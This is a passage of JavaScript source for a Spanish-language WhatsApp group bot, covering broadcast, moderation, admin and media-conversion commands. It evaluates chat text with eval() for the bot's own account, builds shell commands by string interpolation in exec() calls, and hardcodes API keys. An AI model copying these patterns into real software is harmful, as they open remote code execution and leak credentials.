͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏°𝑩𝑹𝑶𝑨𝑫𝑪𝑨𝑺𝑻°` })
					}
					reply('Anuncio dado')
				} else {
					for (let _ of anu) {
						sendMess(_.jid, `	°𝑩𝑹𝑶𝑨𝑫𝑪𝑨𝑺𝑻°\n	[🪀 _NyanBot_]\n\_${args.join(' ')}`)
					}
				}
				reply('Anuncio dado')

				break
			case 'stats':
				if (!isOwner && !itsMe) return await reply('Este comando solo puede ser usado por *Samu330* ⚙')
				texxt = await msg.stats(totalChat1)
				await wa.sendFakeStatus(from, texxt, "BOT STATS")
				break
			case 'bloquear':
				if (!isOwner && !itsMe) return await reply('Este comando solo puede ser usado por *Samu330* ⚙')
				if (isGroup) {
					if (mentionUser.length == 0) return await reply("tag target!")
					return await wa.blockUser(sender, true)
				}
				await wa.blockUser(sender, true)
				break
			case 'desbloquear':
				if (!isOwner && !itsMe) return await reply('Este comando solo puede ser usado por *Samu330* ⚙')
				if (isGroup) {
					if (mentionUser.length == 0) return await reply("Tag targer!")
					return await wa.blockUser(sender, false)
				}
				await wa.blockUser(sender, false)
				break
			case 'salir':
				if (!isOwner && !itsMe) return await reply('Este comando solo puede ser usado por *Samu330* ⚙')
				if (!isGroup) return await reply(mess.only.group)
				reply(`Saldre de este grupo: ${groupName} en 3 segundos`).then(async () => {
					await help.sleep(3000)
					await samu330.groupLeave(from)
				})
				break
			case 'entrabot':
				linkgp = args.join(' ')
				if (!linkgp) return reply('Y el link del grupo... onta!?')
				samu330.query({
					json: ["action", "invite", `${args[0].replace('https://chat.whatsapp.com/', '')}`]
				})
				reply('Ya entre al grupo😉')
				samu330.sendMessage(linkgp.gid, `*Hola* 🙋🏻‍♂️\nSoy Samu _(NyanBot)_, me an designado como *BOT* para este grupo🤖\n\n*Porfavor sige mis reglas, para leer mis reglas escribe:*\n${prefix}reglas\nPorfavor sigelas o atente a las consecuencias⚠\n*Quedo a su dispocicion, no me agan sentir mal.... por que yo tambien tengo corazon😣*`, MessageType.text)
				break
			case 'clearall':
				if (!isOwner && !itsMe) return await reply('Este comando solo puede ser usado por *Samu330* ⚙')
				for (let chat of totalChat) {
					await samu330.modifyChat(chat.jid, "delete")
				}
				await wa.sendFakeStatus(from, "Success clear all chat", "success")
				break

			case 'hidetag':
				if (!isOwner && !itsMe) return await reply('Este comando solo puede ser usado por *Samu330* ⚙')
				if (!isAdmin && !isOwner && !itsMe) return await reply(mess.only.admin)
				await wa.hideTag(from, args.join(" "))
				break
			case 'imagetag':
				if (!isGroup) return await reply(mess.only.group)
				if (!isAdmin && !isOwner && !itsMe) return await reply(mess.only.admin)
				if (!isQuotedImage && !isImage) return await reply(`Lalala... *cancion feliz*\nY la imagen pedazo de nada? >:/`)
				mediatag = isQuotedImage ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : sam
				buffer = await samu330.downloadMediaMessage(mediatag)
				await wa.hideTagImage(from, buffer)
				break
			case 'toimg':
			case 'aimg':
				if (!isQuotedSticker) return reply(`send sticker and reply with caption ${prefix}toimg`)
				if (sam.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.isAnimated === true) {
					reply(`Este comando solo sirve con stikers estaticos, para convertir un stiker a gif, usa: ${prefix}agif`)
				} else {
					var media1 = JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					var media2 = await samu330.downloadAndSaveMediaMessage(media1)
					ran = getRandom('.png')
					exec(`ffmpeg -i ${media2} ${ran}`, (err) => {
						fs.unlinkSync(media2)
						if (err) {
							reply(`error\n\n${err}`)
							fs.unlinkSync(ran)
						} else {
							buffer = fs.readFileSync(ran)
							samu330.sendMessage(from, buffer, MessageType.image, { quoted: sam, caption: '𝗦𝗮𝗺 𝘆 𝗣𝗲𝗿𝗿𝘆🍒' })
							fs.unlinkSync(ran)
						}
					})
				}
				break
			case 'agif':
				ger = isQuotedSticker ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : sam
				var imgbb = require('imgbb-uploader')
				reply('*Espera un momento...*')
				owgi = await samu330.downloadAndSaveMediaMessage(ger)
				data = await imgbb("b0fc132474ca03ee7898fd5cac7275fe", owgi)
				anu = await getJson(`https://api.lolhuman.xyz/api/convert/webptomp4?apikey=${api}&img=${data.display_url}`)
				result = await getBuffer(anu.result)
				samu330.sendMessage(from, result, video, { quoted: ftoko, caption: '𝗦𝗮𝗺 𝘆 𝗣𝗲𝗿𝗿𝘆🍒', mimetype: 'video/gif' })

				break
			case 'toptt':
				reply(`wait..`)
				var media1 = JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				var media2 = await samu330.downloadAndSaveMediaMessage(media1)
				var ran = getRandom('.mp3')
				exec(`ffmpeg -i ${media2} ${ran}`, (err) => {
					fs.unlinkSync(media2)
					if (err) return reply('error')
					topt = fs.readFileSync(ran)
					samu330.sendMessage(from, topt, MessageType.audio, { mimetype: 'audio/mp4', quoted: faud, ptt: true })
				})
				break
			case 'stickertag':
				if (!isGroup) return await reply(mess.only.group)
				if (!isAdmin && !isOwner && !itsMe) return await reply('This command only for admin')
				if (!isQuotedImage && !isImage) return await reply('Etiqueta un stiker')
				media = isQuotedSticker ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : sam
				buffer = await samu330.downloadMediaMessage(media)
				await wa.hideTagSticker(from, buffer)
				break
			case 'promote':
				if (!isGroup) return await reply(mess.only.group)
				if (!isAdmin) return await reply(mess.only.admin)
				if (!botAdmin) return await reply('Botcito debe ser admin')
				if (mentionUser.length == 0) return await reply('Tag member')
				await wa.promoteAdmin(from, mentionUser)
				await reply(`Tenemos nuevo Admin`)
				break
			case 'demote':
				if (!isGroup) return await reply(mess.only.group)
				if (!isAdmin) return await reply(mess.only.admin)
				if (!botAdmin) return await reply(mess.only.Badmin)
				if (mentionUser.length == 0) return await reply('Tag member!')
				await wa.demoteAdmin(from, mentionUser)
				await reply(`jsjs un adm menos`)
				break
			case 'admin':
				var textt = msg.admin(groupAdmins, groupName)
				await wa.sendFakeStatus(from, textt, "LIST ADMIN", groupAdmins)
				break
			case 'link':
				var link = await wa.getGroupInvitationCode(from)
				await wa.sendFakeStatus(from, link, "El lik de este grupo es")
				break
			case 'grupo':
				if (!isGroup) return await reply(mess.only.group)
				if (!isAdmin) return await reply(mess.only.admin)
				if (!botAdmin) return await reply(mess.only.Badmin)
				if (args[0] === 'abrir') {
					samu330.groupSettingChange(from, GroupSettingChange.messageSend, false).then(() => {
						wa.sendFakeStatus(from, "*Success open group*", "GROUP SETTING")
					})
				} else if (args[0] === 'cerrar') {
					samu330.groupSettingChange(from, GroupSettingChange.messageSend, true).then(() => {
						wa.sendFakeStatus(from, "*Succes close group*", "GROUP SETTING")
					})
				} else {
					await reply(`Example: ${prefix}${command} open/close`)
				}
				break

			case 'ttp':
				if (args.length < 1) return reply('Y el texto?')
				var teks = encodeURIComponent(args.join(' '))
				const ttp = await getBuffer(`https://api.xteam.xyz/ttp?file&text=${teks}`)
				samu330.sendMessage(from, ttp, sticker, { quoted: ftoko, contextInfo: { "forwardingScore": 999, "isForwarded": true } })
				break
			case 'añadir':
				if (!isGroup) return reply(mess.only.group)
				if (!botAdmin) return reply(mess.only.Badmin)
				if (args.length < 1) return reply('Y el numero?')
				if (args[0].startsWith('99')) return reply('Utiliza el codigo de pais')
				try {
					num = `${args[0].replace(/ /g, '')}@s.whatsapp.net`
					samu330.groupAdd(from, [num])
				} catch (e) {
					console.log('Error :', e)
					return samu330.sendMessage(from, 'Modo privado dice:v', MessageType.text)
				}
				break

			case 'antileg':
				if (!isGroup) return reply('Este comando es solo para grupos')
				if (args.length < 1) return reply('escriba *1* para activar')
				if (args[0] === '1') {
					if (isAntiLeg) return reply('Ya esta activo')
					legion.push(from)
					fs.writeFileSync('./src/sm330Leg.json', JSON.stringify(legion))
					reply('*Modo antilegiones activado✅*')
				} else if ((args[0]) === '0') {
					var ini = legion.indexOf(from)
					legion.splice(ini, 1)
					fs.writeFileSync('./src/sm330Leg.json', JSON.stringify(legion))
					reply('Antilegiones activado✔️')
				} else {
					reply('*1 para activar, 0 para desactivar*')
				}
				break
			case 'nombre':
				if (!isGroup) return await reply(mess.only.group)
				if (!isAdmin) return await reply(mess.only.admin)
				if (!botAdmin) return await reply(mess.only.Badmin)
				var newName = args.join(" ")
				samu330.groupUpdateSubject(from, newName).then(() => {
					wa.sendFakeStatus(from, "El nombre del grupo se ah cambiao a" + newName, "GROUP SETTING")
				})
				break
			case 'setdesc':
				if (!isGroup) return await reply(mess.only.group)
				if (!isAdmin) return await reply(mess.only.admin)
				if (!botAdmin) return await reply(mess.only.Badmin)
				var newDesc = args.join(" ")
				samu330.groupUpdateDescription(from, newDesc).then(() => {
					wa.sendFakeStatus(from, "La descripcion del grupo se ah cambiado a" + newDesc, "GROUP SETTING")
				})
				break
			case 'wasted':
				var imgbb = require('imgbb-uploader')
				if (((isMedia && !sam.message.videoMessage) || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : sam;
					reply(mess.wait);
					owgi = await samu330.downloadAndSaveMediaMessage(ger);
					anu = await imgbb('20a14861e4f7591f3dc52649cb07ae02', owgi);
					teks = `${anu.display_url}`;
					anu1 = await getBuffer(`https://some-random-api.ml/canvas/wasted?avatar=${teks}`);
					fs.writeFileSync('wasted.jpg', anu1)
					samu330.sendMessage(from, fs.readFileSync('wasted.jpg'), MessageType.image)
				} else {
					reply('Manda la foto!');
				}
				break
		
			case 'ger':
				if (!isRegister) return samu330.sendMessage(from, assistant, image, { quoted: noreg, caption: `😊 Hola, ${timeFt}.\n*Yo soy Sam*, Asistente de *Nexus*.\n\nAl parecer no estas registrado en _*Nexusᴮᴼᵀ*_, Para registrarte usa el comando: *${prefix}reg*`, thumbnail: assistant, contextInfo: { "forwardingScore": 999, "isForwarded": true } })
				var imgbb = require('imgbb-uploader')
				if ((isMedia && !sam.message.videoMessage || isQuotedImage) && args.length == 0) {
					ger = isQuotedImage ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : sam
					reply('*Espera un momento porfavor*')
					owgi = await samu330.downloadAndSaveMediaMessage(ger)
					anu = await imgbb('20a14861e4f7591f3dc52649cb07ae02', owgi)
					teks = `${anu.display_url}`
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu1 = `https://some-random-api.ml/canvas/triggered?avatar=${teks}`
					exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
						fs.unlinkSync(ranp)
						if (err) return reply('*Uuuu, algo salio mal, intenta de nuevo*')
						nobg = fs.readFileSync(rano)
						samu330.sendMessage(from, nobg, sticker, { quoted: ftoko })
						fs.unlinkSync(rano)
					})

				} else {
					reply('Se nececita una foto!')
				}

				break
			case 'antimedia':
				if (!isGroup) return reply(mess.only.group)
				if (!isAdmin) return reply(mess.only.admin)
				if (!botAdmin) return reply(mess.only.Badmin)
				if (args.length < 1) return reply('Escribe *1* para activar')
				if (args[0] === '1') {
					if (isAntiMedia) return reply('*Ya está activo*')
					antimedia.push(from)
					fs.writeFileSync('./src/antimedia.json', JSON.stringify(antimedia))
					reply(`*[ Activado ]*`)
					reply(`*La persona que envie fotos o videos sera eliminada*`)
				} else if (args[0] === '0') {
					var ini = antimedia.indexOf(from)
					antimedia.splice(ini, 1)
					fs.writeFileSync('./src/antimedia.json', JSON.stringify(antimedia))
					reply(`Desactivado`)
				} else {
					reply('1 para activar, 0 para desactivar')
				}
				break

			case 'antifake':
				if (!isWelkom) return reply('*Este comando solo se puede usar cuando la bienvenida esta activada*')
				if (!isGroup) return reply(mess.only.group)
				if (!isAdmin) return reply(mess.only.admin)
				if (!botAdmin) return reply(mess.only.Badmin)
				if (args.length < 1) return reply('Escribe *1* para activar')
				if (args[0] === '1') {
					if (isAntiFake) return reply('*Ya está activo*')
					antifake.push(from)
					fs.writeFileSync('./src/antifake.json', JSON.stringify(antifake))
					reply(`*[ Activado ]*`)
					reply(`*Los numeros considerados como FAKEs, sera eliminados del grupo*`)
				} else if (args[0] === '0') {
					var ini = antifake.indexOf(from)
					antifake.splice(ini, 1)
					fs.writeFileSync('./src/antifake.json', JSON.stringify(antifake))
					reply(`Desactivado`)
				} else {
					reply('1 para activar, 0 para desactivar')
				}
				break
			case '+18':
				if (!isGroup) return reply(mess.only.group)
				if (!isAdmin) return reply(mess.only.admin)

				if (args.length < 1) return reply('Escribe *1* para activar')
				if (args[0] === '1') {
					if (isNsfw) return reply('*Ya está activo*')
					nsfw.push(from)
					fs.writeFileSync('./src/nsfw.json', JSON.stringify(nsfw))
					reply(`*[ Activado ]*`)
				} else if (args[0] === '0') {
					var ini = nsfw.indexOf(from)
					nsfw.splice(ini, 1)
					fs.writeFileSync('./src/nsfw.json', JSON.stringify(nsfw))
					reply(`Desactivado`)
				} else {
					reply('1 para activar, 0 para desactivar')
				}
				break
			//by Sm330
			case 'autostick':
				if (!isGroup) return reply(mess.only.group)
				if (!isAdmin) return reply(mess.only.admin)
				if (args.length < 1) return reply('Escribe *1* para activar')
				if (args[0] === '1') {
					if (isAutoSt) return reply('*Ya está activo*')
					autostick.push(from)
					fs.writeFileSync('./src/autostick.json', JSON.stringify(autostick))
					reply(`*[ Activado ]*`)
					reply(`*ahora, todas las fotos que se envien en el grupo se convertiran en sticker automaticamente*`)
				} else if (args[0] === '0') {
					var ini = autostick.indexOf(from)
					autostick.splice(ini, 1)
					fs.writeFileSync('./src/autostick.json', JSON.stringify(autostick))
					reply(`Desactivado`)
				} else {
					reply('1 para activar, 0 para desactivar')
				}
				break

			case 'antibad':
				if (!isGroup) return reply(mess.only.group)
				if (!isAdmin) return reply(mess.only.admin)
				if (!botAdmin) return reply(mess.only.Badmin)
				if (args.length < 1) return reply('Escribe *1* para activar')
				if (args[0] === '1') {
					if (isBadWord) return reply('*Ya está activo*')
					badword.push(from)
					fs.writeFileSync('./src/badword.json', JSON.stringify(badword))
					reply(`*[ Activado ]*`)
					reply(`*Las personas que envien una mala palabra sera eliminada*. _Para ver la lista de malas palabras usa el comando: listbad_`)
				} else if (args[0] === '0') {
					var ini = antibad.indexOf(from)
					badword.splice(ini, 1)
					fs.writeFileSync('./src/badword.json', JSON.stringify(badword))
					reply(`Desactivado`)
				} else {
					reply('1 para activar, 0 para desactivar')
				}
				break
			case 'addbad':

				if (!isOwner) return reply(mess.only.ownerB)
				if (!isAdmin) return reply(mess.only.admin)
				if (args.length < 1) return reply(`Escribe ${prefix}addbad [palabra]. Ejemplo: ${prefix}addbad pto`)
				const bw = q
				bad.push(bw)
				fs.writeFileSync('./src/bad.json', JSON.stringify(bad))
				reply('Se añadio con exito')

				break
			case 'delbad':

				if (!isOwner) return reply(mess.only.ownerB)
				if (!isAdmin) return reply(mess.only.admin)
				if (args.length < 1) return reply(`Escribe ${prefix}delbad [palabra]. Ejemplo: ${prefix}delbad bego`)
				let dbw = q
				bad.splice(dbw)
				fs.writeFileSync('./src/bad.json', JSON.stringify(bad))
				reply('Se quito con exito')

				break
			case 'listbad':

				let lbw = `Lista de BAD WORD\nTotal : ${bad.length}\n`
				for (let i of bad) {
					lbw += `◦ ${i.replace(bad)}\n`
				}
				await reply(lbw)
				break
			case 'antilink':
				if (!isGroup) return reply(mess.only.group)
				if (!isAdmin) return reply(mess.only.admin)
				if (!botAdmin) return reply(mess.only.Badmin)
				if (args.length < 1) return reply('escriba *1* para activar')
				if (args[0] === '1') {
					if (isAntiLink) return reply('Ya esta activo')
					antilink.push(from)
					fs.writeFileSync('./src/antilink.json', JSON.stringify(antilink))
					reply('*Anti-link activado ✔️*')
					samu330.sendMessage(from, `Los miembros que manden un link serán eliminados, *OJO* _CULAQUIER TIPO DE LINK_`, text)
				} else if ((args[0]) === '0') {
					var ini = antilink.indexOf(from)
					antilink.splice(ini, 1)
					fs.writeFileSync('./src/antilink.json', JSON.stringify(antilink))
					reply('Anti-link desactivado ✔️')
				} else {
					reply('*1 para activar, 0 para desactivar*')
				}
				break
			case 'antigp':
				if (!isGroup) return reply(mess.only.group)
				if (!isAdmin) return reply(mess.only.admin)
				if (!botAdmin) return reply(mess.only.Badmin)
				if (args.length < 1) return reply('escriba *1* para activar')
				if (args[0] === '1') {
					if (isAntigp) return reply('Ya esta activo')
					antigp.push(from)
					fs.writeFileSync('./src/antilink.json', JSON.stringify(antigp))
					reply('*Anti-link de grupos activado ✔️*')
					samu330.sendMessage(from, `Los miembros que manden un link de otro grupo serán eliminados`, text)
				} else if ((args[0]) === '0') {
					var ini = antigp.indexOf(from)
					antigp.splice(ini, 1)
					fs.writeFileSync('./src/antilink.json', JSON.stringify(antigp))
					reply('Anti-link de grupos desactivado ✔️')
				} else {
					reply('*1 para activar, 0 para desactivar*')
				}
				break
			case 'welcome':
				if (!isGroup) return reply('*Comando solo para grupos*')
				if (!isAdmin) return reply(mess.only.admin)
				if (args.length < 1) return reply('ah? que quieres hacer? *1* para activar y *2* para desactivar')
				if (Number(args[0]) === 1) {
					if (isWelkom) return reply('Ya esta activo')
					welkom.push(from)
					fs.writeFileSync('./src/welkom.json', JSON.stringify(welkom))
					reply('Se activo con exito')
				} else if (Number(args[0]) === 0) {
					welkom.splice(from, 1)
					fs.writeFileSync('./src/welkom.json', JSON.stringify(welkom))
					reply('Se desactivo con exito')
				} else {
					reply('1 para activar, 0 desactivar')
				}
				break
			case 'simsimi':
				if (!isGroup) return reply('Este comando es solo para grupos')
				if (args.length < 1) return reply('escriba *1* para activar')
				if (args[0] === '1') {
					if (isSimi) return reply('Ya esta activo')
					simi.push(from)
					fs.writeFileSync('./src/simi.json', JSON.stringify(simi))
					reply('*Modo simi activado✅*')
				} else if ((args[0]) === '0') {
					var ini = simi.indexOf(from)
					simi.splice(ini, 1)
					fs.writeFileSync('./src/simi.json', JSON.stringify(simi))
					reply('Modo simsimi off ✔️')
				} else {
					reply('*1 para activar, 0 para desactivar*')
				}



			default:
				if (body.startsWith(">")) {
					if (!itsMe) return await reply('Este comando solo puede ser usado por *Samu330* ⚙')
					return await reply(JSON.stringify(eval(args.join(" ")), null, 2))
				}
				if (isSimi && !itsMe && body != undefined) {
					res = await getJson(`https://api.simsimi.net/v1/?text=${body}&lang=es`)
					reply(res.success)
				}
				if (isGroup && isAntiLink && isUrl(body) && !isAdmin && body != undefined) {
					var sial = sender.split('@')[0] + "@s.whatsapp.net"
					samu330.groupRemove(from, [sial])
				}
		}
	} catch (e) {
		const emror = String(e)
		if (emror.includes('convert')) {
			return
		}
		if (emror.includes('fileLength')) {
			return
		}
		console.log(chalk.greenBright("├"), chalk.keyword("yellow")("[  ERROR  ]"), chalk.keyword("red")(e))
	}
})

